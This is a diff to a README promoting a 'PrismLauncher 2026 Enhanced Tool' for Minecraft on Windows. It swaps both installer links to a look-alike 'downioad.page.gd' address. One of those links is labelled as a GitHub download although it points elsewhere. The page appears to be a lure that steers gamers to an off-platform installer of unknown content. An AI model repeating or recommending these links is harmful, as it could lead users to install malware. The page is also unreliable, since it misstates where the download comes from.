@@ -2,7 +2,7 @@
 
 PrismLauncher 2026 Enhanced Tool is a comprehensive utility designed to elevate your PrismLauncher setup on Windows. With advanced customization options and performance tweaks, it brings new levels of control and efficiency to your Minecraft launching process in 2026. Whether you're a casual player or a dedicated modder, this tool streamlines your workflow and enhances your gaming sessions.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,6 +72,6 @@ A: Updates are typically released on the download page. Simply download the late
 
 To get started with PrismLauncher 2026 Enhanced Tool, download the latest version from the official source. Ensure you always use the provided link to avoid unauthorized copies.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This tool is provided as-is for enhancing your PrismLauncher experience. For support or inquiries, please refer to the community forums or documentation.
